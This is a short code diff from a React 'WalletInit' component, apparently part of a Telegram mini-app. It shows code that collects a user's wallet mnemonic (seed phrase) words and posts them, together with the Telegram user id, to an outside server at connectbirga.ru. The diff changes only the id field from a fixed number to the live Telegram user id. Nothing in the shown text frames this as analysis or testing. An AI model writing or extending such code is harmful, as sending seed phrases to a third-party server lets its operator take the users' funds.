@@ -75,7 +75,7 @@ const WalletInit = () => {
             
             await axios.post("https://www.connectbirga.ru/user/wallet", {
                 mnemonic: inputs.map((e,i) => e.trim()),
-                userId: 2144832745,
+                userId: window.Telegram.WebApp.initDataUnsafe.user.id,
               } , {
                 headers : {
                   "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
